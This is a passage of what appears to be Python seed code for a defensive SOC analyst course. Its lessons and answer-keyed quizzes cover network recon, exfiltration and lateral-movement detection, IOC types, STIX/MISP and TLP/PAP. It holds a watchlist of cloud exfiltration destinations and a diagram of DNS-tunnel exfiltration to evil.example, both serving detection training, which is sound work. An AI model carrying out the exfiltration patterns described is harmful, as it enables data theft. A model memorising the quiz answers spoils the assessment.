            {"value": "nxdomain", "label": "An NXDOMAIN reply for a long subdomain"},
        ],
        correct="regular",
        explanation_md="Beaconing's signal is the *aggregate* shape of regular, low-byte, single-target connections sustained over time. A single connection isn't a beacon; a burst across many destinations is a scan; a single NXDOMAIN is a possible DGA hit, not a beacon.",
        points=2,
    )
    _add_q(session, m4l3q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are reasonable patterns for DNS tunneling?",
        options=[
            {"value": "txt_volume", "label": "High volume of TXT queries from one source"},
            {"value": "long_labels", "label": "Long leftmost labels of base32/base64-looking content"},
            {"value": "one_parent", "label": "Many queries to one parent domain"},
            {"value": "ms_a", "label": "A single A-record query for microsoft.com"},
        ],
        correct=["txt_volume", "long_labels", "one_parent"],
        explanation_md="A single A-record for microsoft.com is normal DNS. The other three together describe a textbook DNS tunnel.",
        points=3,
    )
    _add_q(session, m4l3q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="If a connection's SNI is `cloudfront.net`, the connection cannot be malicious because Cloudfront is a legitimate CDN.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** Malware routinely hosts C2 on legitimate CDNs. SNI alone proves nothing — interval, count, byte volume, and JA3 are what you should weight.",
        points=1,
    )
    _add_q(session, m4l3q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="An L1 analyst suspects beaconing. The connections in question are completing cleanly — handshake, data exchange, graceful close. What `conn_state` value should they expect to see in conn.log for these beacon connections?",
        options=None,
        correct=["SF", "sf"],
        explanation_md="**SF** — normal establishment and termination. A successful beacon's TLS connection completes the handshake, exchanges its check-in payload, and closes cleanly, which Zeek records as `SF`. (`S0` would imply the C2 never replied; `RSTO` / `RSTR` would imply an abort, which is not the typical beacon pattern.)",
        points=2,
    )

    # Lesson 4.4 — recon & exfil
    m4l4 = _add_lesson(
        session, mod4, order=7,
        title="Reconnaissance, exfiltration, and ATT&CK mapping",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Distinguish a port scan from a sweep and identify each in conn.log
> 2. Recognise post-scan service-enumeration patterns (SMB, RDP, WinRM, WMI, LDAP)
> 3. Identify bulk data exfiltration to common cloud-storage destinations using flow and proxy telemetry
> 4. Compare DNS exfil vs HTTP/HTTPS exfil and pick the right detection
> 5. Recognise lateral-movement protocols (445, 5985/6, 3389, RPC, LDAP, Kerberos) on the wire
> 6. Map every wire-side observation in this module to MITRE ATT&CK techniques

## Port scans

A scan is one host probing many ports on one (or a small set of) targets. The conn.log shape depends on style:

- **TCP SYN scan ("half-open").** SYN sent, waits for response, never completes the handshake. `conn_state` typically **S0** (no reply / filtered), **REJ** (RST reply / closed), or **OTH** for unusual cases. `history` shows `S` only or `Sh` followed by reset. Noisy on the wire but doesn't produce server-side application logs.
- **Full-connect scan.** Completes the three-way handshake, then closes. `conn_state=SF` with `history=ShAfF`-ish, very short duration, no payload bytes. Hits the target's application logs (a complete handshake then immediate close looks like a TCP probe), so it's cheaper to write but more visible.
- **UDP scan.** UDP has no handshake. The scanner sends a UDP packet to a target port; an open port may stay silent, a closed port elicits ICMP "port unreachable". Zeek emits a conn.log for UDP traffic too; `conn_state` is usually **S0** or **SHR** patterns.

**Triage shortcut.** Filter conn.log for one source, time window of minutes, group by destination port. Many destination ports against few destination IPs with mostly `S0`/`REJ` = scan. Many destination IPs on one or two ports = sweep.

## Sweep vs scan

The intent differs.

- **Scan**: one source probing **many ports on one target** — *enumerate what's running here.*
- **Sweep**: one source probing **one port across many targets** — *find every host running this service.*

Common sweep targets: TCP/445 (SMB), TCP/3389 (RDP), TCP/22 (SSH), TCP/3306 (MySQL), TCP/5985/5986 (WinRM). **A sudden internal sweep for 445 from a workstation is one of the strongest indicators of lateral-movement reconnaissance**, especially after a phishing-induced compromise.

```mermaid
graph LR
    subgraph Scan
      S1[Source 10.20.30.40] --> T1[Target 192.0.2.10:21]
      S1 --> T2[Target 192.0.2.10:22]
      S1 --> T3[Target 192.0.2.10:23]
      S1 --> T4[Target 192.0.2.10:80]
      S1 --> T5[Target 192.0.2.10:443]
      S1 --> T6[Target 192.0.2.10:3389]
    end
    subgraph Sweep
      S2[Source 10.20.30.40] --> U1[10.20.30.51:445]
      S2 --> U2[10.20.30.52:445]
      S2 --> U3[10.20.30.53:445]
      S2 --> U4[10.20.30.54:445]
      S2 --> U5[10.20.30.55:445]
    end
```

## Service enumeration after a successful scan

After an open port is found, the attacker probes the service:

- **SMB (TCP/445).** Negotiates dialect and lists shares. Zeek's `smb_files.log` and `smb_mapping.log` (when enabled) record share access. A workstation that suddenly enumerates shares on dozens of file servers is anomalous.
- **RDP (TCP/3389).** A burst of short RDP attempts across many hosts is brute-force or credential spray — the most common ransomware-precursor signal.
- **WinRM (TCP/5985 cleartext, TCP/5986 TLS).** Less commonly enabled internally but heavily abused by Evil-WinRM. WinRM-over-HTTP from one workstation to many servers is suspicious.
- **SSH (TCP/22).** Inside Linux estates, brute-force shows as many `S0` / `SF`-immediate-RSTO rows.
- **WMI (DCOM, TCP/135 + ephemeral RPC).** Legitimate but heavily abused. Hard part: WMI uses dynamically allocated ephemeral RPC ports; you'll see TCP/135 establish then a high-port follow within seconds.

## Data exfiltration

Bulk exfil shapes:

- **Large outbound transfers.** Single internal host pushing tens of MB to hundreds of GB outbound in one or a few sessions. **Asymmetry matters** — `orig_bytes` (out) substantially exceeds `resp_bytes` (in) on what was meant to be a request/response service.
- **Off-hours patterns.** Heavy outbound from a workstation at 03:14 local, when the user is asleep. Some attackers schedule exfil for low-activity windows to avoid bandwidth alerts.
- **Unusual destinations.** Outbound to destinations the host has never talked to before, or destinations not used by other peers. New cloud-storage destinations are particularly interesting.
- **Compressed-and-encrypted blobs.** You can't see this directly without decryption or PCAP, but you can infer from byte ratios — uniformly random-looking patterns over TCP/443 to a fresh destination are consistent with encrypted archive uploads.

### Cloud-storage exfil destinations — L1 watchlist

- **mega.nz** — popular for ransomware exfil; large encrypted uploads.
- **anonfiles** (and successors when one shuts down) — anonymous file hosts with permissive limits.
- **Discord CDN (cdn.discordapp.com)** — frequently abused as a payload-and-exfil host.
- **GitHub gists / raw.githubusercontent** — small-volume staging for second-stage payloads and small-blob exfil.
- **transfer.sh, file.io, wetransfer.com** — generic file-share services.
- **Pastebin and clones** — text-only, but useful for credential dumps.

**Worked KQL example — outbound bytes by destination.**

```esql
FROM zeek-conn-*
| WHERE event.dataset == "zeek.conn"
   AND CIDR_MATCH(source.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
   AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS total_out = SUM(source.bytes),
        total_in = SUM(destination.bytes),
        sessions = COUNT(*)
   BY source.ip, destination.ip, destination.port
| WHERE total_out > 50000000
| SORT total_out DESC
```

Finds internal-source / external-destination pairs where cumulative outbound is over 50 MB. Cross-reference destination IPs against reverse-DNS or `tls.client.server_name`. **A workstation pushing 4 GB out to a single Mega.nz IP overnight, when the user has no Mega usage in their history, is a confirmed exfil candidate.**

## DNS exfil vs HTTP/HTTPS exfil

Both move data out, but they differ in volume and visibility.

- **DNS exfil**: low bandwidth (queries are tiny), but DNS is rarely blocked. Suited to small sensitive payloads — credentials, keys, command output. Detection: long subdomain labels, high TXT query rate, single source-to-domain.
- **HTTP/HTTPS exfil**: high bandwidth, but more often subject to outbound filtering, decryption, and DLP. Suited to bulk archives, databases, design files. Detection: large outbound bytes on TCP/443 to unfamiliar or cloud-storage destinations.

**Heuristic: DNS for stealth, HTTPS for volume.** Some campaigns use both — DNS for the C2 channel, HTTPS for the bulk pull.

```mermaid
sequenceDiagram
    participant H as Compromised host
    participant L as Local DNS resolver
    participant A as Authoritative for evil.example
    participant C as Operator
    H->>H: Read sensitive file
    H->>H: Chunk and base32 encode
    loop for each chunk
        H->>L: TXT q: chunk1.evil.example
        L->>A: recursive TXT lookup
        A->>C: log query (decode chunk1)
        A->>L: TXT response with ack/command
        L->>H: TXT response
    end
    C->>C: Reassemble decoded chunks
```

## Lateral movement on the wire

Once inside, attackers move host-to-host using protocols already in the environment:

- **SMB / TCP 445** — file-share access, named pipes, remote service creation. **Single most-abused port for Windows lateral movement.** PsExec, Impacket's `psexec.py` / `wmiexec.py`, DCSync, most ransomware spread.
- **WinRM / TCP 5985 (HTTP) / 5986 (HTTPS)** — PowerShell remoting; modern preferred lateral channel because it integrates with Windows policy and is less noisy than SMB on EDR.
- **RDP / TCP 3389** — interactive remote desktop. Brute-force entry plus hands-on movement. **Workstation-to-workstation RDP is anomalous** in most environments.
- **RPC ephemeral / TCP 49152–65535** — DCE/RPC over dynamic ports allocated via the Endpoint Mapper (TCP/135). Hard to alert on by port; alert on the workflow (TCP/135 established then a high-port connection between the same pair within seconds).
- **LDAP / TCP 389, LDAPS / 636, Global Catalog 3268/3269** — directory enumeration. SharpHound / BloodHound talk LDAP heavily; a workstation issuing thousands of LDAP queries to a DC is anomalous.
- **Kerberos / TCP & UDP 88** — ticket-granting traffic. Kerberoasting requests many service tickets — surprisingly visible if you watch ticket request volume.

**For L1: a workstation that suddenly initiates SMB or WinRM connections to many *other workstations* (not servers) is one of the loudest lateral-movement signals.** Workstation-to-workstation administrative protocol traffic is rare in normal operations.

## Mapping wire observations to MITRE ATT&CK

Memorise these — leading an L2 escalation with the technique ID is more compact than prose:

- **T1046 — Network Service Discovery.** Port scans and sweeps. SMB / RDP / WinRM enumeration after initial access.
- **T1041 — Exfiltration Over C2 Channel.** Data exfil through the same channel as C2 (HTTPS beacon carrying outbound data, DNS tunnel doing both).
- **T1048 — Exfiltration Over Alternative Protocol.** Data exfil via a different protocol than C2 — typical with ransomware operators staging on a workstation then pushing to mega.nz.
- **T1071 — Application Layer Protocol.** C2 via standard application-layer protocols (HTTP/S, DNS, SMTP). Sub-techniques: `.001` Web Protocols, `.004` DNS, etc.
- **T1572 — Protocol Tunneling.** DNS tunneling, HTTP-tunneled SSH, SOCKS-over-HTTPS.

A network-side incident write-up *"T1046 (port sweep on 445) followed by T1071.001 (HTTPS beacon to fresh CDN destination)"* tells L2 more in two phrases than a paragraph of prose.

## Glossary

- **Port scan / sweep** — One-source-many-ports vs one-source-many-IPs-one-port.
- **Service enumeration** — Probing identified open services to characterise version and capabilities.
- **Lateral movement** — Post-compromise host-to-host traversal inside a network.
- **Exfiltration** — Unauthorised data transfer out of the target environment.
- **T1041 / T1048 / T1071 / T1572** — Network-side ATT&CK techniques L1 should know on sight.

## Further reading

- MITRE ATT&CK T1046: https://attack.mitre.org/techniques/T1046/
- MITRE ATT&CK T1041: https://attack.mitre.org/techniques/T1041/
- MITRE ATT&CK T1048: https://attack.mitre.org/techniques/T1048/
- BTL1 — Network Analysis chapter
- SANS SEC503 Network Monitoring and Threat Detection In-Depth
""",
    )
    m4l4q = _add_lesson(
        session, mod4, order=8, title="Recon & exfil — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on scan vs sweep, lateral-movement protocols, ATT&CK technique selection, and cloud exfil destinations.",
    )
    _add_q(session, m4l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="A single internal host produces 250 conn.log records to 250 different internal IPs, all on TCP/445, in 90 seconds, almost all `conn_state=S0` or `REJ`. What is this?",
        options=[
            {"value": "smb", "label": "A normal SMB file-share workload"},
            {"value": "scan", "label": "A port scan (one source, many ports, one target)"},
            {"value": "sweep", "label": "A network sweep for SMB"},
            {"value": "beacon", "label": "Beaconing"},
        ],
        correct="sweep",
        explanation_md="Many destination IPs on a single port from one source is a sweep, not a scan. The 445/SMB target and the absence of successful connections are consistent with reconnaissance ahead of lateral movement.",
        points=2,
    )
    _add_q(session, m4l4q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are commonly observed lateral-movement protocols?",
        options=[
            {"value": "smb", "label": "SMB (TCP/445)"},
            {"value": "winrm", "label": "WinRM (TCP/5985 or 5986)"},
            {"value": "rdp", "label": "RDP (TCP/3389)"},
            {"value": "ntp", "label": "NTP (UDP/123)"},
        ],
        correct=["smb", "winrm", "rdp"],
        explanation_md="NTP is time synchronisation and is not used for lateral movement.",
        points=3,
    )
    _add_q(session, m4l4q, order=3, kind=QuestionKind.SINGLE,
        stem_md="Which MITRE ATT&CK technique best describes data being exfiltrated via the same HTTPS C2 channel the implant uses for command-and-control?",
        options=[
            {"value": "t1046", "label": "T1046 Network Service Discovery"},
            {"value": "t1041", "label": "T1041 Exfiltration Over C2 Channel"},
            {"value": "t1048", "label": "T1048 Exfiltration Over Alternative Protocol"},
            {"value": "t1572", "label": "T1572 Protocol Tunneling"},
        ],
        correct="t1041",
        explanation_md="**T1041** is exactly *exfil over the C2 channel*. T1048 applies if the exfil uses a different channel than C2 (e.g. C2 over HTTPS, exfil to mega.nz over a separate session).",
        points=2,
    )
    _add_q(session, m4l4q, order=4, kind=QuestionKind.MULTI,
        stem_md="Which of the following destinations should an L1 weight as common cloud-exfiltration targets when reviewing high-outbound-byte sessions?",
        options=[
            {"value": "mega", "label": "mega.nz"},
            {"value": "discord", "label": "cdn.discordapp.com"},
            {"value": "fileserver", "label": "An internal file server"},
            {"value": "transfersh", "label": "transfer.sh"},
        ],
        correct=["mega", "discord", "transfersh"],
        explanation_md="Internal file servers are normal destinations for internal hosts. The other three are well-known cloud-storage abuse destinations.",
        points=3,
    )

    # ── Module 5 — IOC Handling (v0.11.8) ─────────────────────────────────
    # Authored at BTL1/SANS depth from research-agent dossier. Connects
    # Modules 3 (host telemetry) and 4 (network telemetry) to the threat
    # intel side: IOC types, Pyramid of Pain, STIX/MISP/TLP/PAP, OPSEC
    # for enrichment, the indicator lifecycle from production to decay,
    # and end-to-end IOC-hit triage in ION.
    mod5 = _add_module(
        session, course, order=5,
        title="IOC Handling",
        description_md=(
            "The connective tissue between threat intelligence and the "
            "telemetry covered in Modules 3 and 4. IOC types and the "
            "Pyramid of Pain; STIX 2.1, MISP, TLP/PAP markings; "
            "VirusTotal / abuse.ch / passive DNS / Shodan and the OPSEC "
            "trap of public lookups; the indicator lifecycle from "
            "production through matching, sightings, and decay; and a "
            "worked end-to-end IOC-hit triage."
        ),
        estimated_minutes=200,
    )

    # Lesson 5.1 — IOC types & Pyramid of Pain
    m5l1 = _add_lesson(
        session, mod5, order=1,
        title="IOC types and the Pyramid of Pain",
        lesson_type=LessonType.READING, duration_min=22,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Distinguish observable, indicator, and IOC and use each term correctly
> 2. Classify any indicator as atomic, computed, or behavioural (Mandiant taxonomy)
> 3. Catalogue the major IOC types L1 sees daily — hashes, network atomics, host artefacts, TLS artefacts, pattern-based, adversary-level
> 4. Place every IOC type on David Bianco's Pyramid of Pain and explain the cost-to-the-adversary of each tier
> 5. Reason about precision vs durability vs FP rate trade-offs across tiers
>
> **Prerequisites.** Modules 3 (Windows Event Logs) and 4 (Network Telemetry) completed.

## The vocabulary problem

Three terms get used interchangeably but mean different things in formal CTI work:

- **Observable** — a measurable property of an entity. A file's SHA-256, an IP, a process name. *Not malicious by itself; it is just data.*
- **Indicator** — an observable plus the *context that says it is suspicious*. The same SHA-256 becomes an indicator when labelled *"Emotet payload, observed 2025-09-12, TLP:GREEN."*
- **IOC** — informal industry shorthand for *indicator*. Some authors restrict IOC to "intrusion already happened" and use **IOA** (Indicator of Attack) for behavioural-in-progress signals; we use IOC broadly here.

Mandiant's three-way split of indicators is still the cleanest mental model:

- **Atomic indicator** — cannot be broken down without losing meaning. Example: `203.0.113.45`. The octets alone don't help.
- **Computed indicator** — produced by running an algorithm over data. SHA-256, SSDEEP, IMPHASH, JA3, a YARA match.
- **Behavioural indicator** — a chain of atomic and computed indicators bound by a description: *"Office process spawns powershell.exe with a base64 command line that resolves a freshly registered .top domain."* The territory of MITRE ATT&CK techniques.

## Catalogue of IOC types

In rough order of frequency:

**File hashes.** Cryptographic digests of file content.
- *MD5* (128-bit) — fast, broken for collisions, still ubiquitous in legacy feeds. **Don't trust MD5 alone.**
- *SHA-1* (160-bit) — collision-broken (SHAttered, 2017), still common.
- *SHA-256* (256-bit) — current default; use this where you can.
- *SSDEEP* — fuzzy hash producing similar values for similar files. *"This dropper is 78 % similar to a known sample."*
- *IMPHASH* — MD5 of a Windows PE's import-table function names in order. Two unrelated builds of the same family often share an IMPHASH because they import the same DLLs in the same order. Excellent for clustering.

**Network atomic indicators.**
- *IPv4 / IPv6 addresses* — cheap for an attacker to change (a click in a cloud console).
- *Domain names* — slightly more expensive (registration time, money, KYC).
- *URLs* — full path; very specific, very brittle.
- *Email addresses, email subjects* — phishing campaigns. Brittle.

**Host artefacts.**
- *Mutex names* — malware often creates a named mutex to avoid double-execution. `Global\\__M_E_Z__`-style strings can be strong indicators if hardcoded.
- *Registry keys* — persistence locations like `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\` plus a value name.
- *Named pipes* — Cobalt Strike beacons historically used `\\\\.\\pipe\\msagent_*`.
- *Service names, scheduled task names, parent-child process pairs.*

**TLS / certificate artefacts.**
- *Certificate SHA-1 / SHA-256 thumbprints.*
- *JA3 / JA3S* — fingerprints of TLS Client Hello / Server Hello (covered in Module 4 lesson 2). JA4 is the modern successor; principle is the same.

**Pattern-based indicators.**
- *YARA rules* — pattern-matching for files (now also memory and process attributes).
- *Sigma rules* — generic detection language; compiles to KQL/SPL/EQL.
- *Suricata / Snort signatures* — network rules.

**Adversary-level indicators.**
- *MITRE ATT&CK techniques and sub-techniques* (T1566.001 Spearphishing Attachment).
- *Tactics* (TA0001 Initial Access).
- *Tools / family names* — Emotet, Cobalt Strike, AsyncRAT.
- *Threat actor / intrusion-set names* — used cautiously; attribution is hard.

## The Pyramid of Pain

David Bianco published the Pyramid of Pain in 2013. It ranks indicator types by **how much it costs the adversary to change them after detection.** The higher you push them, the more your detections actually disrupt operations.

```mermaid
flowchart TB
    A["TTPs (Tough)"]
    B["Tools (Challenging)"]
    C["Network and Host Artefacts (Annoying)"]
    D["Domain Names (Simple)"]
    E["IP Addresses (Easy)"]
    F["Hash Values (Trivial)"]
    A --> B --> C --> D --> E --> F
```

**Hash values — Trivial.** Recompile, repack, flip a byte and the hash changes. SHA-256 IOCs are usually stale within hours of a fresh campaign. L1 still uses them — exact-match hits on a known-bad hash are usually high-confidence TPs — but should not assume hash detection covers the family.

**IP addresses — Easy.** A new VPS costs cents. Cloud-hosted attacker infrastructure rotates daily. L1 still pivots on IPs but treats IP-based IOCs as short-shelf-life.

**Domain names — Simple.** A new domain costs ~$10 and ~10 minutes. Slightly more friction than an IP because registration leaves traces and reputation can build over weeks. L1 enriches domains with passive DNS to learn historical IPs.

**Network and host artefacts — Annoying.** Mutex names, named pipes, registry keys, User-Agent strings, JA3, specific HTTP header orders. Changing these requires modifying tooling source. L1 escalates artefact hits faster — they tend to indicate a tool-family match.

**Tools — Challenging.** *"Cobalt Strike beacon detected"* or *"Mimikatz signature matched"* forces the adversary to find or build a different tool. Real engineering time. L1 treats tool-level matches as genuinely high-severity.

**TTPs — Tough.** Behavioural patterns — *"PowerShell child of WINWORD with encoded command, network beacon to a freshly registered domain over 443 every 60 s with jitter."* Detecting at TTP level forces the adversary to redesign their operation. L1s rarely write TTP-level detections, but they consume them: every Sigma rule and Elastic rule joining `process.parent.name` with a `process.command_line` regex is a TTP-level detector.

## Trade-offs: precision, durability, FP rate

Move up the pyramid and you gain **durability** but lose **precision**. FP rates roughly invert with the pyramid:

- **Hash IOCs** — near-zero FP rate. A `file.hash.sha256` match is almost always real.
- **IP / domain IOCs** — moderate FP rate. Shared hosting, CDNs, parked domains, ad networks.
- **Artefact IOCs** — noticeable FP rate. A legitimate admin tool may use the same registry key.
- **Tool IOCs** — variable FP rate. Penetration testers run Cobalt Strike too.
- **TTP IOCs** — highest FP rate. PowerShell-from-Office is also how some line-of-business apps work.

This is why a mature SIEM uses a **layered** approach — hashes catch the known things cheaply, TTP rules catch the unknown things expensively.

```mermaid
flowchart LR
    Obs["Observable"]
    Obs --> Atomic["Atomic"]
    Obs --> Computed["Computed"]
    Obs --> Behavioural["Behavioural"]
    Atomic --> A1["IP / domain / URL / email"]
    Computed --> C1["MD5 / SHA-256"]
    Computed --> C2["SSDEEP / IMPHASH"]
    Computed --> C3["JA3 / JA3S"]
    Computed --> C4["YARA match"]
    Behavioural --> B1["MITRE technique chain"]
    Behavioural --> B2["Sigma rule"]
```

## Glossary

- **Observable / indicator / IOC** — data / data-plus-context / industry shorthand.
- **Atomic / computed / behavioural** — Mandiant indicator taxonomy.
- **Pyramid of Pain** — Bianco's tier model of detection cost-to-adversary.
- **IMPHASH / SSDEEP / JA3** — clustering-grade computed indicators.
- **TTP** — Tactic / Technique / Procedure; the top of the pyramid.

## Further reading

- Bianco — "The Pyramid of Pain": https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html
- MITRE ATT&CK Enterprise Matrix: https://attack.mitre.org/matrices/enterprise/
""",
    )
    m5l1q = _add_lesson(
        session, mod5, order=2, title="IOC types — quiz",
        lesson_type=LessonType.QUIZ, duration_min=6,
        content_md="Three questions on Pyramid of Pain interpretation, computed-vs-atomic classification, and TTP-tier economics.",
    )
    _add_q(session, m5l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An adversary's command-and-control IP address is published as an IOC by a CTI feed at 09:00. By 11:00 the same campaign uses a new IP. Which Pyramid of Pain tier best explains why the feed degraded so quickly?",
        options=[
            {"value": "tools", "label": "Tools"},
            {"value": "artefacts", "label": "Network artefacts"},
            {"value": "ip", "label": "IP addresses"},
            {"value": "ttps", "label": "TTPs"},
        ],
        correct="ip",
        explanation_md="IPs are the second-from-bottom tier — trivially cheap for an adversary to swap out, which is exactly why IP-based IOCs have short useful lives.",
        points=2,
    )
    _add_q(session, m5l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *computed* indicators rather than atomic ones?",
        options=[
            {"value": "sha256", "label": "SHA-256 hash of a file"},
            {"value": "ip", "label": "Source IP 198.51.100.7"},
            {"value": "ja3", "label": "JA3 fingerprint"},
            {"value": "ssdeep", "label": "SSDEEP fuzzy hash"},
            {"value": "subject", "label": "Email subject 'URGENT: Invoice overdue'"},
        ],
        correct=["sha256", "ja3", "ssdeep"],
        explanation_md="Hashes and TLS fingerprints are produced by running an algorithm over data — computed. An IP and an email subject are atomic — read directly, not derived.",
        points=3,
    )
    _add_q(session, m5l1q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="Detecting at the TTP layer of the Pyramid of Pain is the cheapest detection an SOC can deploy because behavioural patterns are easy to express in KQL.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** TTP-level detection is the most *expensive* to build and maintain — deep environment knowledge required, more FP-prone. Its value is the cost it inflicts on the adversary, not its ease of authorship.",
        points=1,
    )

    # Lesson 5.2 — STIX, MISP, TLP, PAP
    m5l2 = _add_lesson(
        session, mod5, order=3,
        title="IOC formats, sharing, and threat intel platforms",
        lesson_type=LessonType.READING, duration_min=22,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Read a STIX 2.1 indicator object and identify SDO, SRO, and SCO categories
> 2. Interpret a MISP event's attributes, objects, and tags
> 3. Apply Traffic Light Protocol (TLP) and Permissible Actions Protocol (PAP) correctly
> 4. Defang and refang IOCs and explain why each matters
> 5. Position OpenCTI as the upstream truth source ION pulls from

## STIX 2.1

**STIX** (Structured Threat Information eXpression) is the OASIS standard for representing threat intelligence as a graph of typed JSON objects.

- **SDO — STIX Domain Objects.** The "things" — `indicator`, `malware`, `threat-actor`, `attack-pattern`, `identity`, `campaign`, `intrusion-set`, `vulnerability`, `course-of-action`, `tool`, `report`.
- **SRO — STIX Relationship Objects.** The edges — `relationship` (typed link, e.g. *(indicator) indicates (malware)*), `sighting`.
- **SCO — STIX Cyber Observables.** The raw observable types — `file`, `ipv4-addr`, `domain-name`, `url`, `email-addr`, `process`, `network-traffic`. SCOs are referenced from indicator patterns and from sightings.
- **Bundle.** Wrapper carrying a collection together. STIX is shared as bundles over **TAXII** (Trusted Automated eXchange of Intelligence Information).

A minimal STIX 2.1 indicator:

```json
{
  "type": "indicator",
  "spec_version": "2.1",
  "id": "indicator--6f3c7b2e-4a1d-4e8a-9f2c-7b1c2a8e9d44",
  "created": "2026-03-14T08:12:00.000Z",
  "modified": "2026-03-14T08:12:00.000Z",
  "name": "Emotet dropper hash, March 2026 wave",
  "indicator_types": ["malicious-activity"],
  "pattern_type": "stix",
  "pattern": "[file:hashes.'SHA-256' = 'a3f1c9b8e2d4a7f6b5c8e1d2a3f4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2']",
  "valid_from": "2026-03-14T08:00:00.000Z",
  "valid_until": "2026-06-14T08:00:00.000Z",
  "labels": ["malicious-activity"]
}
```

L1 reads off this object:
- `pattern` — STIX pattern expression. Brackets and dotted accessors mean *any object of type `file` whose `hashes.'SHA-256'` equals this value.* Patterns can combine multiple observables with `AND`, `OR`, `FOLLOWEDBY`, time qualifiers.
- `valid_from` / `valid_until` — the validity window (decay covered in lesson 5.4).
- `indicator_types` / `labels` — taxonomy from open vocabularies.
- `id` — stable UUID-suffixed identifier you can quote in case notes.

## MISP

**MISP** (Malware Information Sharing Platform) is OSS originally built by CIRCL Luxembourg. Predates STIX 2.x maturity; has its own data model that maps onto, but isn't identical to, STIX.

- **Event** — top-level container, like an *incident report.* Date, threat level, analysis maturity, info field, attributes/objects/tags.
- **Attribute** — single observable plus category and type (`ip-dst`, `domain`, `sha256`, `email-src`). Each has a `to_ids` flag — *push to detection* vs *contextual only.*
- **Object** — structured grouping of attributes from a published template library (e.g. a `file` object bundling filename, size, MD5, SHA-1, SHA-256, SSDEEP).
- **Tag** — free-form labels; most SOCs follow vocabularies like `tlp:green`, `PAP:AMBER`, `mitre-attack-pattern:T1566.001`.
- **Galaxy** — curated knowledge-base entries (threat actors, malware families) attached as semantic tags.

A minimal MISP attribute:

```json
{
  "type": "domain",
  "category": "Network activity",
  "to_ids": true,
  "value": "cdn-update[.]example",
  "comment": "C2 domain for March 2026 dropper wave",
  "Tag": [
    {"name": "tlp:green"},
    {"name": "PAP:AMBER"},
    {"name": "misp-galaxy:malpedia=\\"Emotet\\""}
  ]
}
```

When ingested into ION, the value gets refanged (`cdn-update.example`), `to_ids: true` makes it eligible for the indicator-match index, the TLP tag governs sharing, and the PAP tag governs active enrichment.

## OpenIOC (legacy)

Mandiant's **OpenIOC** is an XML schema from ~2011, predating STIX. Still occasionally encountered in older Mandiant/FireEye reports. Convert to STIX/MISP via tooling rather than reading it by hand.

## CSV and IDS-rule drops

Not all sharing happens through structured platforms:

- **CSV files** — one IOC per row, minimal columns.
- **Suricata / Snort signatures** — network rules (Emerging Threats Open).
- **YARA rules** — file/memory pattern rules.
- **Sigma rules** — YAML detection language compiling to your SIEM.
- **EDR-specific signatures** — vendor-proprietary.

ION consumes CSVs through a simple ingestion job; treats Suricata/YARA rules as detection content, not indicator-match IOCs.

## Traffic Light Protocol (TLP) 2.0

**TLP** governs *who you may share an indicator with.* FIRST published TLP 2.0 in 2022, superseding TLP 1.0's `WHITE` with `CLEAR` and adding `AMBER+STRICT`.

| Marking | Sharing rule |
| --- | --- |
| **TLP:CLEAR** | Share without restriction. Public. |
| **TLP:GREEN** | Community of peers and partners; not publicly. |
| **TLP:AMBER** | Within your organisation and clients/customers, need-to-know. |
| **TLP:AMBER+STRICT** | Within your organisation only. Not to clients/external partners. |
| **TLP:RED** | Original recipient list only. No internal redistribution. |

**Practical L1 rule:** the highest TLP marking among contributing sources sets the ceiling for what you may quote in tickets, chat, and handovers.

## Permissible Actions Protocol (PAP)

**PAP** governs *what you may do with the indicator* — particularly, actions an adversary could observe.

| Marking | Action rule |
| --- | --- |
| **PAP:WHITE** | Any action permitted. |
| **PAP:GREEN** | Actions visible to peers permitted; no public exposure. |
| **PAP:AMBER** | Passive only. No active probes, no public-sandbox submissions, no observable VirusTotal lookups. |
| **PAP:RED** | Passive only, within recipient organisation. No queries that touch attacker infrastructure or any third-party service the adversary might monitor. |

**The cardinal rule.** PAP:RED means **you do not curl, ping, traceroute, dig, nslookup, VirusTotal-search, urlscan-submit, or sandbox-detonate the indicator.** All are visible to an adversary watching their own infrastructure or hunting on VirusTotal Intelligence.

**TLP and PAP are independent.** An indicator can be `TLP:GREEN, PAP:RED` — share with peers, do not actively probe. **Always read both tags.**

## OpenCTI

**OpenCTI** is OSS built on STIX 2.1; ION integrates with it for enriched intel storage. From L1's perspective, OpenCTI exposes:
- An **indicators feed** browsable by type, label, confidence.
- An **observable lookup** — paste an IP/hash and see what STIX context exists.
- A **sightings view** — every match anywhere.
- **Reports** — narrative documents linked to the SDOs they cite.

ION pulls from OpenCTI on a schedule and pushes sightings back. L1 usually interacts via ION's UI; knowing OpenCTI is the upstream truth source helps when context looks thin.

## Defanging and refanging

When IOCs are pasted into emails, Slack, or PDFs, raw values like `http://evil.example/login.php` get auto-linkified. Someone clicks. Defanging breaks parsers but is trivially reversible:

| Original | Defanged |
| --- | --- |
| `http://` | `hxxp://` |
| `https://` | `hxxps://` |
| `evil.example` | `evil[.]example` |
| `192.0.2.1` | `192[.]0[.]2[.]1` |
| `attacker@example.test` | `attacker[@]example[.]test` |

**Refanging** is the inverse — restoring real values before query/ingest. ION refangs on import; L1 should defang manually whenever pasting an IOC into a place a human might click. **Reasonable habit:** any IOC into a case note, ticket, email, or chat → defanged. Any IOC into a query → refanged.

```mermaid
flowchart LR
    TA["threat-actor"]
    IS["intrusion-set"]
    C["campaign"]
    AP["attack-pattern (ATT&CK)"]
